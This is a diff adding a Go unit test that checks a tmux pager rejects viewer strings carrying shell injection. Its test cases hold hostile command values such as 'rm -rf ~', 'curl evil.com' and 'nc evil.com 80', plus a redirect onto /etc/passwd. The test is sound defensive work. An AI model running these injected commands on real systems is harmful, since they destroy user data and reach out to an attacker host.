@@ -53,6 +53,39 @@ func TestPager_RejectsEmptyViewer(t *testing.T) {
 	}
 }
 
+// TestPager_RejectsViewerWithShellMetacharacters guards review finding
+// S2: the viewer string is interpolated unquoted into a `bash -c` line.
+// All current callers pass hardcoded constants, but the contract is
+// public — a future caller wiring viewer from $FLOW_NOTE_VIEWER would
+// otherwise re-open the injection surface. The reject keeps it closed.
+func TestPager_RejectsViewerWithShellMetacharacters(t *testing.T) {
+	cases := []struct {
+		name   string
+		viewer string
+	}{
+		{"semicolon", "less; rm -rf ~"},
+		{"command substitution", "less $(curl evil.com)"},
+		{"backtick", "less `whoami`"},
+		{"pipe", "less | nc evil.com 80"},
+		{"and-chain", "less && curl evil.com"},
+		{"redirect", "less > /etc/passwd"},
+		{"newline", "less\ncurl evil.com"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			tmux := &testutil.FakeTmux{}
+			tg := output.New(t.TempDir(), tmux)
+			err := tg.Pager("x", tc.viewer, "md")
+			if err == nil {
+				t.Fatalf("Pager must reject viewer %q", tc.viewer)
+			}
+			if len(tmux.Splits) != 0 {
+				t.Errorf("no tmux split must fire for rejected viewer (got %v)", tmux.Splits)
+			}
+		})
+	}
+}
+
 func TestPager_PropagatesTmuxSplitError(t *testing.T) {
 	want := errors.New("split-window failed")
 	tmux := &testutil.FakeTmux{SplitErr: want}
